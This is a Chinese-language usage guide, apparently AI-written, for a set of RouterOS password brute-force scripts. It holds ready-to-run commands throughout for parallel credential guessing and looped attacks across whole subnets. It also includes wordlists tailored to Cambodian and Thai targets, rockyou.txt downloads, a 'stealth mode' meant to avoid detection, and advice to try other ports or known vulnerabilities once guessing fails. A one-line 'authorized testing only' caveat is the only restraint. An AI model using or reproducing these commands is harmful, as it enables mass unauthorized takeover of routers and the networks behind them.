# 🔥 RouterOS 最佳爆破工具使用指南

## ⭐ 推荐：routeros_ultimate_brute.py

这是**最强大、最实用**的RouterOS爆破工具！

---

## 📋 快速开始

### 基础用法
```bash
python3 routeros_ultimate_brute.py http://target
```

### 并发模式（推荐！速度快10-20倍）
```bash
python3 routeros_ultimate_brute.py http://target --parallel --workers 20
```

### 强制指定方法
```bash
python3 routeros_ultimate_brute.py http://target --method basic_auth
```

---

## 🎯 实战场景

### 场景1：快速测试单个路由器
```bash
python3 routeros_ultimate_brute.py http://192.168.1.1 --parallel -w 20
```

### 场景2：批量扫描整个网段
```bash
# 生成目标列表
for i in {1..254}; do 
    echo "http://192.168.1.$i"
done > targets.txt

# 逐个攻击
while read target; do
    python3 routeros_ultimate_brute.py "$target" --parallel -w 20
done < targets.txt
```

### 场景3：已知是HTTP Basic Auth
```bash
python3 routeros_ultimate_brute.py http://target --method basic_auth --parallel -w 30
```

---

## 💪 高级用法 - 大字典爆破

如果默认凭据失败，使用字典模式：

### 准备密码字典
```bash
# 创建自定义字典
cat > passwords.txt << EOF
admin
password
mikrotik
router
secret
P@ssw0rd
admin123
root123
mikrotik123
cambodia
thailand
khmer
bangkok
phnompenh
EOF
```

### 使用字典爆破
```bash
python3 routeros_dict_brute.py http://target \
    -U admin \
    -p passwords.txt \
    --parallel -w 50
```

### 超大字典（rockyou.txt）
```bash
# 下载rockyou字典
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 爆破（可能需要很长时间）
python3 routeros_dict_brute.py http://target \
    -U admin \
    -p rockyou.txt \
    --parallel -w 100
```

---

## ⚡ 性能对比

| 模式 | 速度 | 使用场景 |
|------|------|---------|
| 串行模式 | ~1次/秒 | 单个目标，不着急 |
| 并发10线程 | ~10次/秒 | 单个目标，快速测试 |
| 并发20线程 | ~20次/秒 | **推荐！平衡速度和稳定性** |
| 并发50线程 | ~40次/秒 | 大字典爆破 |
| 并发100线程 | ~50次/秒 | 超大字典（可能被Ban） |

---

## 📊 工具对比

### 1. routeros_ultimate_brute.py ⭐⭐⭐⭐⭐
**最推荐！适合：** 99%的场景
```bash
python3 routeros_ultimate_brute.py http://target --parallel -w 20
```
- ✅ 自动检测目标
- ✅ 多协议支持
- ✅ 并发快速
- ✅ 28个精选凭据

### 2. routeros_dict_brute.py ⭐⭐⭐⭐
**适合：** 大字典爆破
```bash
python3 routeros_dict_brute.py http://target -u users.txt -p pass.txt --parallel
```
- ✅ 支持自定义字典
- ✅ 超大字典支持
- ✅ 并发模式

### 3. mass_routeros_attack.py ⭐⭐⭐⭐
**适合：** 批量扫描
```bash
python3 mass_routeros_attack.py -f targets.txt -w 20
```
- ✅ 批量处理
- ✅ 并发攻击

---

## 🎓 成功率提升技巧

### 1. 使用地区定制密码
```bash
# 针对柬埔寨/泰国
python3 routeros_dict_brute.py http://target -U admin \
    -P "cambodia,thailand,khmer,bangkok,phnompenh"
```

### 2. 尝试所有用户名
```bash
# 创建用户名字典
cat > users.txt << EOF
admin
administrator
root
user
mikrotik
support
EOF

python3 routeros_dict_brute.py http://target \
    -u users.txt -p passwords.txt --parallel
```

### 3. 组合攻击
```bash
# 先用终极工具快速测试
python3 routeros_ultimate_brute.py http://target --parallel -w 20

# 如果失败，用大字典
python3 routeros_dict_brute.py http://target -U admin -p rockyou.txt --parallel -w 100
```

---

## 🛡️ 注意事项

1. **合法使用** - 仅用于授权测试
2. **速率限制** - RouterOS可能有防爆破，从-w 10开始
3. **目标选择** - 优先攻击HTTP Basic Auth（更容易）
4. **网络稳定** - 确保网络连接稳定

---

## 💡 常见问题

**Q: 所有凭据都失败怎么办？**
A: 
1. 尝试大字典（rockyou.txt）
2. 检查是否有防爆破机制（降低并发数）
3. 尝试其他端口（WinBox 8291、API 8728）
4. 查找已知漏洞

**Q: 如何最快？**
A: 使用并发模式 + 多线程
```bash
python3 routeros_ultimate_brute.py http://target --parallel -w 50
```

**Q: 如何最成功？**
A: 使用超大字典
```bash
python3 routeros_dict_brute.py http://target -U admin -p rockyou.txt --parallel -w 100
```

---

## 🎯 推荐配置

### 日常使用（推荐）
```bash
python3 routeros_ultimate_brute.py http://target --parallel --workers 20
```

### 高速模式
```bash
python3 routeros_ultimate_brute.py http://target --parallel --workers 50
```

### 隐蔽模式（慢但不容易被发现）
```bash
python3 routeros_ultimate_brute.py http://target --workers 1
```

---

## 📝 总结

**最佳选择：`routeros_ultimate_brute.py`**

**推荐命令：**
```bash
cd /root/mikrotik_ecsrp5_toolkit
python3 routeros_ultimate_brute.py http://target --parallel --workers 20
```

**这就是最好的爆破方式！** 🚀
